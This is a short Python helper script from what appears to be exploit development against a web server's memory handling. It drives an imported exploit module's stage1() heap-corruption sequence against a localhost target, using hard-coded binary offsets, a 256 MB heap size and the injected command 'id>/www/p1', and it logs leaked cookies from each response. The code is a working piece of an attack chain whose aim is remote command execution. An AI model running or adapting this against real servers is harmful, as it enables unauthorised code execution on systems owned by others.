#!/usr/bin/env python3
"""Capture the RAW B-response cookie during the REAL stage1() A+B sequence,
using exploit.py's Exploit sender. Wraps Target.post to log each response
length + decoded cookie. This is the valid comparison (unlike a B-only send,
the A-prime request that creates the OOM heap state is included)."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 18111

t = exploit.Target(f"http://127.0.0.1:{PORT}/", timeout=120, verbose=False)
ex = exploit.Exploit(t, "id>/www/p1", zif_offset=0x3ac080, dtor_offset=0x49ec50,
                     htdata_offset=0x690d8, huge_mb=256, verbose=False,
                     profile="bookworm")
ex.stage1_n = 841

# Wrap post to log raw response length + decoded cookie per call.
_orig_post = t.post
calls = []
def spy_post(body, boundary, **kw):
    resp = _orig_post(body, boundary, **kw)
    ck = exploit.parse_cookie(resp)
    calls.append((len(resp), len(ck), ck[:48]))
    return resp
t.post = spy_post

ex.rotate()
chunk = ex.stage1()
print(f"port {PORT}: stage1 chunk = {chunk or 0:#x}", flush=True)
for i, (rl, cl, head) in enumerate(calls):
    print(f"  resp[{i}] raw={rl}B cookie={cl}B head={head!r}", flush=True)
